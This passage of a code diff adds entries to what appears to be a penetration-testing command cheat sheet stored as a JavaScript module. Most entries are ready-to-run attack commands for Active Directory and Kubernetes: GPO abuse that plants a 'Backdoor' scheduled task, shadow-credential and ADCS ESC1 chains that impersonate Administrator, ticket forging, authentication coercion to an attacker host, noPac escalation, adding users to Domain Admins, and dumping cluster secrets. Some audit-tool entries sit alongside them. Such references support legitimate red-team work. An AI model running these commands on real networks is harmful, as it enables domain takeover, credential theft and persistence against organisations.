+          { title: "PowerView Invoke-ShareFinder", cmd: "Invoke-ShareFinder -Verbose -CheckShareAccess", tags: ["essential"], desc: "Find accessible network shares across the domain" },
+          { title: "PowerView Get-DomainSID", cmd: "Get-DomainSID", tags: ["essential"], desc: "Get the current domain SID" },
+          { title: "PowerView Find-LocalAdminAccess Threaded", cmd: "Find-LocalAdminAccess -Threads 20", tags: ["essential"], desc: "Find machines where current user has local admin (threaded)" },
+          { title: "Windapsearch Groups", cmd: "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> -G", tags: ["tool"], desc: "Enumerate domain groups via LDAP" },
+          { title: "Windapsearch Privileged Users", cmd: "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> --da", tags: ["tool"], desc: "Enumerate domain admins via LDAP" },
+          { title: "Windapsearch Unconstrained Delegation", cmd: "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> --unconstrained", tags: ["tool"], desc: "Find unconstrained delegation computers via LDAP" },
+          { title: "LDAP Domain Dump HTML", cmd: "ldapdomaindump <DC_IP> -u '<DOMAIN>\\<USER>' -p '<PASS>' -o /tmp/ldap_dump/", tags: ["essential"], desc: "Generate browsable HTML reports of domain objects" },
+          { title: "Kerbrute Brute Force", cmd: "kerbrute bruteuser --dc <DC_IP> -d <DOMAIN> /usr/share/wordlists/rockyou.txt <USER>", tags: ["tool"], desc: "Brute force a single user password via Kerberos" },
+          { title: "Enum GPO Permissions", cmd: "Get-DomainGPO | ForEach-Object { Get-DomainObjectAcl -Identity $_.distinguishedname -ResolveGUIDs } | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl|WriteOwner' } | Select-Object ObjectDN, ActiveDirectoryRights, IdentityReferenceName", tags: ["advanced"], desc: "Find GPOs that can be modified by non-admin users" },
+          { title: "Enum GPO Linked to OUs", cmd: "Get-DomainOU | ForEach-Object { $ou = $_; ($_.gplink -split '\\[LDAP://') | ForEach-Object { if($_) { [PSCustomObject]@{OU=$ou.name; GPO=$_.split(';')[0].TrimEnd(']')} } } }", tags: ["advanced"], desc: "Map GPOs to their linked Organizational Units" },
+          { title: "LAPS Check via CrackMapExec", cmd: "crackmapexec ldap <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> -M laps", tags: ["essential"], desc: "Check if LAPS passwords are readable" },
+          { title: "ADRecon Comprehensive Report", cmd: "powershell -ep bypass -c \"Import-Module .\\ADRecon.ps1; Invoke-ADRecon -Method LDAP -DomainController <DC_IP> -Credential $cred\"", tags: ["tool"], desc: "Generate comprehensive AD reconnaissance report" }
         ]
       },
       {
@@ -1695,7 +1805,23 @@ module.exports = [
           { title: "LAPS Abuse (CrackMapExec)", cmd: "crackmapexec ldap <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --module laps", tags: ["essential"], desc: "Dump LAPS passwords for all computers if authorized" },
           { title: "Shadow Credentials Attack", cmd: "python3 pywhisker.py -d <DOMAIN> -u <USER> -p <PASS> --target <TARGET_COMPUTER>$ --action add --dc-ip <DC_IP>", tags: ["advanced"], desc: "Add shadow credentials to a computer object for PKINIT auth" },
           { title: "DPAPI Master Key Extraction", cmd: "impacket-dpapi backupkeys -t <DC_IP> -u <USER> -p <PASS>", tags: ["advanced"], desc: "Extract DPAPI backup keys from the domain controller" },
-          { title: "Group Policy Abuse (SharpGPOAbuse)", cmd: "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName \"Default Domain Policy\"", tags: ["advanced"], desc: "Abuse writable GPO to add user as local admin on target machines" }
+          { title: "Group Policy Abuse (SharpGPOAbuse)", cmd: "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName \"Default Domain Policy\"", tags: ["advanced"], desc: "Abuse writable GPO to add user as local admin on target machines" },
+          { title: "GPO Abuse Scheduled Task", cmd: "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Backdoor' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators <USER> /add' --GPOName '<GPO_NAME>'", tags: ["advanced"], desc: "Add scheduled task via writable GPO for code execution" },
+          { title: "Shadow Credentials (Whisker)", cmd: "Whisker.exe add /target:<TARGET_COMPUTER>$ /domain:<DOMAIN> /dc:<DC_HOSTNAME>", tags: ["advanced"], desc: "Add shadow credentials to a computer account using Whisker" },
+          { title: "Shadow Credentials + Rubeus PKINIT", cmds: ["python3 pywhisker.py -d <DOMAIN> -u <USER> -p <PASS> --target <TARGET_COMPUTER>$ --action add --dc-ip <DC_IP>", "python3 gettgtpkinit.py <DOMAIN>/<TARGET_COMPUTER>$ <TARGET_COMPUTER>.ccache -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASS>", "export KRB5CCNAME=<TARGET_COMPUTER>.ccache", "python3 getnthash.py <DOMAIN>/<TARGET_COMPUTER>$ -key <AS_REP_KEY>"], tags: ["advanced"], desc: "Full shadow credentials attack chain for computer account takeover" },
+          { title: "LAPS Abuse (PowerView)", cmd: "Get-DomainComputer -Identity <TARGET_COMPUTER> -Properties ms-mcs-admpwd", tags: ["essential"], desc: "Read LAPS password with PowerView if authorized" },
+          { title: "LAPS Abuse (LAPSToolkit)", cmds: ["Import-Module .\\LAPSToolkit.ps1", "Get-LAPSComputers", "Find-LAPSDelegatedGroups"], tags: ["tool"], desc: "Enumerate LAPS deployment and find who can read passwords" },
+          { title: "ADCS ESC1 (Certify)", cmd: "Certify.exe find /vulnerable", tags: ["essential"], desc: "Find vulnerable AD CS certificate templates (ESC1-ESC8)" },
+          { title: "ADCS ESC1 Request Cert", cmd: "Certify.exe request /ca:<CA_SERVER>\\<CA_NAME> /template:<TEMPLATE_NAME> /altname:Administrator", tags: ["essential"], desc: "Request certificate as Administrator via vulnerable template" },
+          { title: "ADCS Certipy Find", cmd: "certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable", tags: ["essential"], desc: "Find vulnerable certificate templates with certipy" },
+          { title: "ADCS Certipy ESC1 Exploit", cmds: ["certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -ca <CA_NAME> -template <TEMPLATE_NAME> -upn Administrator@<DOMAIN>", "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>"], tags: ["essential"], desc: "Full ESC1 attack: request certificate and authenticate" },
+          { title: "Diamond Ticket (Impacket)", cmd: "python3 ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn krbtgt/<DOMAIN> Administrator", tags: ["advanced"], desc: "Forge a Diamond Ticket using impacket" },
+          { title: "Coercer All Methods", cmd: "python3 Coercer.py coerce -u <USER> -p <PASS> -d <DOMAIN> -t <TARGET_IP> -l <ATTACKER_IP> --always-continue", tags: ["tool"], desc: "Try all known coercion methods against a target" },
+          { title: "DFSCoerce", cmd: "python3 dfscoerce.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>", tags: ["tool"], desc: "Coerce authentication via MS-DFSNM DFS service" },
+          { title: "ShadowCoerce", cmd: "python3 shadowcoerce.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>", tags: ["tool"], desc: "Coerce authentication via MS-FSRVP shadow copy service" },
+          { title: "noPac (SAM Account Name Spoofing)", cmd: "python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> --impersonate Administrator -use-ldap -dump", tags: ["advanced"], desc: "CVE-2021-42278/42287 - Spoof computer name for domain admin" },
+          { title: "Add Domain Admin (PowerView)", cmds: ["Add-DomainGroupMember -Identity 'Domain Admins' -Members '<USER>'"], tags: ["advanced"], desc: "Add a user to Domain Admins if you have write access" },
+          { title: "ForceChangePassword (PowerView)", cmd: "Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)", tags: ["advanced"], desc: "Force reset a user's password if you have the permission" }
         ]
       }
     ]
@@ -1760,7 +1886,9 @@ module.exports = [
           { title: "xfreerdp (Hash — Restricted Admin)", cmd: "xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<NTLM_HASH> /d:<DOMAIN> /dynamic-resolution", tags: ["advanced"], desc: "RDP Pass the Hash via Restricted Admin mode" },
           { title: "xfreerdp with Drive Sharing", cmd: "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /d:<DOMAIN> /drive:share,/tmp/share", tags: ["tool"], desc: "RDP connection with a shared local directory" },
           { title: "rdesktop", cmd: "rdesktop -u <USER> -p '<PASS>' -d <DOMAIN> <TARGET_IP>", tags: ["tool"], desc: "Connect via RDP with rdesktop" },
-          { title: "Enable RDP Remotely", cmd: "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -M rdp -o ACTION=enable", tags: ["advanced"], desc: "Enable RDP on a remote host via CrackMapExec" }
+          { title: "Enable RDP Remotely", cmd: "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -M rdp -o ACTION=enable", tags: ["advanced"], desc: "Enable RDP on a remote host via CrackMapExec" },
+          { title: "xfreerdp with Certificate Ignore", cmd: "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /cert-ignore /dynamic-resolution +clipboard", tags: ["essential"], desc: "RDP ignoring certificate warnings" },
+          { title: "RDP Pass-the-Hash Check", cmd: "crackmapexec rdp <TARGET_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN>", tags: ["tool"], desc: "Test if RDP PtH via Restricted Admin is possible" }
         ]
       },
       {
@@ -2300,7 +2428,25 @@ module.exports = [
           { title: "Get Pod Security Policies", cmd: "kubectl get psp", tags: ["tool"], desc: "List Pod Security Policies to find misconfigurations" },
           { title: "Etcd Read Secrets", cmd: "ETCDCTL_API=3 etcdctl --endpoints=https://<ETCD_IP>:2379 --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca get / --prefix --keys-only", tags: ["advanced"], desc: "Enumerate etcd keys if etcd is accessible" },
           { title: "Etcd Dump Kubernetes Secrets", cmd: "ETCDCTL_API=3 etcdctl --endpoints=https://<ETCD_IP>:2379 --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca get /registry/secrets --prefix --print-value-only", tags: ["advanced"], desc: "Dump all Kubernetes secrets directly from etcd" },
-          { title: "Create Privileged Pod", cmd: "kubectl run pwned --image=alpine --restart=Never --overrides='{\"spec\":{\"containers\":[{\"name\":\"pwned\",\"image\":\"alpine\",\"command\":[\"/bin/sh\"],\"stdin\":true,\"tty\":true,\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"name\":\"host\",\"hostPath\":{\"path\":\"/\"}}]}}'", tags: ["advanced"], desc: "Create a privileged pod mounting the host filesystem" }
+          { title: "Create Privileged Pod", cmd: "kubectl run pwned --image=alpine --restart=Never --overrides='{\"spec\":{\"containers\":[{\"name\":\"pwned\",\"image\":\"alpine\",\"command\":[\"/bin/sh\"],\"stdin\":true,\"tty\":true,\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"name\":\"host\",\"hostPath\":{\"path\":\"/\"}}]}}'", tags: ["advanced"], desc: "Create a privileged pod mounting the host filesystem" },
+          { title: "Get Ingress Rules", cmd: "kubectl get ingress --all-namespaces", tags: ["tool"], desc: "List all ingress rules for endpoint discovery" },
+          { title: "Get Network Policies", cmd: "kubectl get networkpolicies --all-namespaces", tags: ["tool"], desc: "List network policies to find unrestricted namespaces" },
+          { title: "Get Persistent Volumes", cmd: "kubectl get pv,pvc --all-namespaces", tags: ["tool"], desc: "List persistent volumes and claims for data access" },
+          { title: "Get DaemonSets", cmd: "kubectl get daemonsets --all-namespaces", tags: ["tool"], desc: "List DaemonSets running on all nodes" },
+          { title: "Get Pod Environment Variables", cmd: "kubectl exec <POD_NAME> -n <NAMESPACE> -- env | sort", tags: ["essential"], desc: "Extract environment variables from a running pod" },
+          { title: "Get Pod Logs", cmd: "kubectl logs <POD_NAME> -n <NAMESPACE> --all-containers", tags: ["tool"], desc: "View pod logs for sensitive information leakage" },
+          { title: "Kubectl Proxy for API Access", cmd: "kubectl proxy --port=8001 &", tags: ["tool"], desc: "Start local proxy to Kubernetes API for easy access" },
+          { title: "List RBAC Roles", cmd: "kubectl get roles,clusterroles --all-namespaces -o wide", tags: ["tool"], desc: "List all RBAC roles to identify overly permissive roles" },
+          { title: "List RBAC Bindings", cmd: "kubectl get rolebindings,clusterrolebindings --all-namespaces -o wide", tags: ["tool"], desc: "List role bindings to find privilege assignments" },
+          { title: "Kube-Hunter Remote Scan", cmd: "kube-hunter --remote <TARGET_IP>", tags: ["tool"], desc: "Scan Kubernetes cluster for security issues remotely" },
+          { title: "Kube-Hunter Internal Scan", cmd: "kube-hunter --internal", tags: ["tool"], desc: "Scan Kubernetes cluster from within a pod" },
+          { title: "Kube-Bench CIS Benchmark", cmd: "kube-bench run --targets master,node", tags: ["tool"], desc: "Run CIS Kubernetes Benchmark checks" },
+          { title: "Trivy Image Scan", cmd: "trivy image <IMAGE_NAME>:<TAG>", tags: ["essential"], desc: "Scan a container image for vulnerabilities" },
+          { title: "Trivy Filesystem Scan", cmd: "trivy fs /path/to/project", tags: ["tool"], desc: "Scan filesystem for vulnerabilities and misconfigurations" },
+          { title: "Trivy K8s Cluster Scan", cmd: "trivy k8s --report summary cluster", tags: ["tool"], desc: "Scan Kubernetes cluster for security issues" },
+          { title: "Docker Bench Security", cmd: "docker run -it --net host --pid host --userns host --cap-add audit_control -v /var/lib:/var/lib -v /var/run/docker.sock:/var/run/docker.sock -v /etc:/etc --label docker_bench_security docker/docker-bench-security", tags: ["tool"], desc: "Run Docker CIS Benchmark security audit" },
+          { title: "Falco Runtime Security", cmd: "falco -r /etc/falco/falco_rules.yaml", tags: ["advanced"], desc: "Runtime security monitoring for containers" },
+          { title: "Kubectl Token from Pod", cmds: ["# From within a pod:", "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)", "APISERVER=https://kubernetes.default.svc", "curl -sk $APISERVER/api/v1/namespaces -H \"Authorization: Bearer $TOKEN\""], tags: ["essential"], desc: "Use service account token to query Kubernetes API from within a pod" }
         ]
       },
       {
